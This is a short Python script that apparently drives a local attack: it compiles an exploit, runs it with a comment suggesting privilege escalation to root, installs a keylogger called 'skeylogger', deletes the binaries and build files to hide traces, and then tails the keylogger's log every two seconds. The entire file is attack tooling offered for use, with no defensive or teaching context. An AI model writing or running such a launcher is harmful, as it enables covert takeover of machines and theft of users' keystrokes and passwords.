import os, time

def r(command):
	os.system(command)

def main():
	# Compilation
	r("make")
	r("gcc exploit.c")
	
	# Move compiled files to home
	r("cp a.out ~")
	r("cp skeylogger ~")
	
	# Give exec permissions to both files
	r("chmod +x ~/a.out")
	r("chmod +x ~/skeylogger")

	# Start su
	r("cd ~ && ./a.out")
	
	# Clean
	r("rm ~/a.out ~/skeylogger")
	r("make clean")
	
	while (True):
		r("cat /var/log/skeylogger.log")
		time.sleep(2)	

if __name__ == "__main__":
	main()
